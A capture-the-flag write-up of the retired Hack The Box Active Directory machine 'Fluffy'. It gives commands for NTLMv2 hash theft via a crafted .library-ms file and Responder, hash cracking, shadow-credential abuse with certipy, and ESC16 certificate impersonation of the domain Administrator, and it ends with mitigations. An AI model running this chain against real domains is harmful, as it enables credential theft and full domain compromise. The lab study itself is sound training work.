---
machine: Fluffy
os: Windows
difficulty: Easy
platform: Hack The Box
category: Active Directory
state: Retired
tags: [windows, active-directory, ntlm-theft, cve-2025-24071, shadow-credentials, adcs, esc16]
---

# Fluffy — Hack The Box

**English** | [🇪🇸 Español](README.md)

> **State:** Retired. Methodology notes; no flags or real credentials.

## TL;DR

An assumed-breach box: we are handed low-privilege credentials (`j.fleischman`). A writable SMB share lets us drop a `.library-ms` file and capture another user's NTLMv2 hash (CVE-2025-24071). With `p.agila` we see ACLs over `winrm_svc` and `ca_svc`: shadow credentials for WinRM, then **ESC16** on the CA to issue an Administrator certificate.

## Recon

```bash
nmap -p- -sCV <IP> -oN nmap.txt
```

A DC with 53, 88, 135, 139, 389, 445, 464, 593, 636, 3268, 5985 and 9389. Domain `fluffy.htb`, host `DC01.fluffy.htb`.

```bash
nxc smb <IP> -u j.fleischman -p '<password>' --shares
nxc smb <IP> -u j.fleischman -p '<password>' --users
```

The `IT` share is writable and holds internal documentation naming another user: `p.agila`.

## Access

1. **NTLM theft (CVE-2025-24071)**: craft a `.library-ms` pointing at our listener and upload it to the share. When the victim opens it, they authenticate to us.

```bash
responder -I tun0 -wv
# upload the .library-ms to the IT share
hashcat -m 5600 hash.txt /usr/share/wordlists/rockyou.txt
```

2. **Enumeration as `p.agila`**:

```bash
bloodhound-python -u p.agila -p '<password>' -d fluffy.htb -ns <IP> -c all
nxc ldap <IP> -u p.agila -p '<password>' --bloodhound --collection All
```

BloodHound shows `GenericWrite`/ACLs over `winrm_svc` and `ca_svc`.

3. **Shadow credentials on `winrm_svc`**:

```bash
certipy shadow auto -u p.agila@fluffy.htb -p '<password>' -account winrm_svc -dc-ip <IP>
evil-winrm -i dc01.fluffy.htb -u winrm_svc -H <hash>
```

## Escalation

The CA is **ESC16**: the security extension is disabled on the template, so a certificate issued to `ca_svc` can be reused by swapping the UPN.

```bash
certipy find -u ca_svc@fluffy.htb -hashes <hash> -dc-ip <IP> -vulnerable -stdout
# ESC16: Disabled Extensions = 1.3.6.1.4.1.311.25.2
```

```bash
# 1. ca_svc UPN → administrator
bloodyAD -u ca_svc -p '<password>' -d fluffy.htb --host <IP> set object ca_svc userPrincipalName -v administrator@fluffy.htb

# 2. Request the certificate and authenticate
certipy req -u ca_svc@fluffy.htb -hashes <hash> -ca FLUFFY-CA -template User -dc-ip <IP>
certipy auth -pfx administrator.pfx -dc-ip <IP> -username administrator -domain fluffy.htb

# 3. Revert the UPN
```

```bash
evil-winrm -i dc01.fluffy.htb -u administrator -H <hash_admin>
```

## Pitfalls

- The `.library-ms` needs the right UNC path and Responder listening on the VPN interface.
- `certipy auth` fails on clock skew: use `faketime` or sync time.
- Revert `ca_svc`'s UPN afterwards or the CA is left inconsistent.
- The starting password is given in the brief; no brute force needed.

## Lessons

- A writable share plus an authentication-forcing file format equals credential theft.
- Chained ACLs (`GenericWrite` over service accounts) turn a normal user into a CA administrator.
- ESC16: disabling the security extension allows UPN swaps and impersonation of any principal.
- Mitigation: block outbound NTLM, review service-account ACLs, and keep the security extension enabled on templates.
